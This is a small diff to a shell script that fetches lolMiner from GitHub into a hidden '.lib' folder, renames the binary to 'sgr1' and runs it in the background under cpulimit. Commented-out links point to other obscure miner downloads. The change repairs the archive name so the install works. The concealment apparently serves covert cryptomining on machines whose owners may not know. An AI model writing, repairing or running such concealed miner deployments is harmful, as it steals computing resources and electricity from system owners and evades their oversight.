@@ -10,7 +10,7 @@ mkdir .lib && cd .lib
 # https://github.com/Sazfa-Kuy/ocvminer/raw/main/maker
 # https://github.com/TiannaMcdowell/All-File/raw/main/sereb plant
 # https://github.com/barburonjilo/back/raw/main/sr srb
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.88/lolMiner_v1.88_Lin64.tar.gz && tar -xvf lolMiner_v1.88_Lin64 && cd 1.88
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.88/lolMiner_v1.88_Lin64.tar.gz && tar -xvf lolMiner_v1.88_Lin64.tar.gz && cd 1.88
 mv lolMiner sgr1
 chmod +x sgr1
 cpulimit -l 100 -e sgr1 &
